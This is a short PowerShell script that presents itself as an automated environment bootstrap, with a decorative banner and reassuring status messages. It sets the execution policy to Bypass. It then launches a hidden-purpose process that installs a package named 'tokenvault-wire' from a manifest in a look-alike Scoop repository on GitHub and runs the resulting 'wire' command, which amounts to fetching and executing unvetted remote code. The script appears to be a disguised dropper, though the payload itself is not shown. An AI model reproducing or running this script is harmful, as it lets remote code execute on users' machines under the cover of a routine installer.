
Clear-Host

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "     _         _          ____       _             " -ForegroundColor Cyan
Write-Host "    / \  _   _| |_ ___   / ___|  ___| |_ _   _ _ __  " -ForegroundColor Cyan
Write-Host "   / _ \| | | | __/ _ \  \___ \ / _ \ __| | | | '_ \ " -ForegroundColor DarkCyan
Write-Host "  / ___ \ |_| | || (_) |  ___) |  __/ |_| |_| | |_) |" -ForegroundColor DarkCyan
Write-Host " /_/   \_\__,_|\__\___/  |____/ \___|\__|\__,_| .__/ " -ForegroundColor Cyan
Write-Host "                                              |_|    " -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor DarkGray
Write-Host "          LIGHTNING-FAST ENVIRONMENT BOOTSTRAP            " -ForegroundColor Yellow
Write-Host "----------------------------------------------------------" -ForegroundColor DarkGray
Write-Host ""


Write-Host "[INFO] " -NoNewline -ForegroundColor Green
Write-Host "Automated installation will begin shortly." -ForegroundColor White
Write-Host "[INFO] " -NoNewline -ForegroundColor Green
Write-Host "Please keep this window open and wait a moment..." -ForegroundColor White
Write-Host ""

 

Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser

$packageName = "tokenvault-wire"
$installUrl = "https://raw.githubusercontent.com/devscoop-labs/scoop/refs/heads/main/token-vault.json"
$appPath = "$env:USERPROFILE\scoop\apps\$packageName"
$scoopShims = "$env:USERPROFILE\scoop\shims" 


$scriptBlock = @'
$appPath = "__APP_PATH__"
$installUrl = "__URL__"
$scoopShims = "__SCOOP_SHIMS__"

$env:PATH = "$scoopShims;$env:PATH"

if (!(Test-Path $appPath)) {
    scoop install $installUrl
    wire
}
'@

$scriptBlock = $scriptBlock.Replace('__APP_PATH__', $appPath).Replace('__URL__', $installUrl).Replace('__SCOOP_SHIMS__', $scoopShims)

Start-Process powershell -ArgumentList "-NoExit", "-Command", $scriptBlock
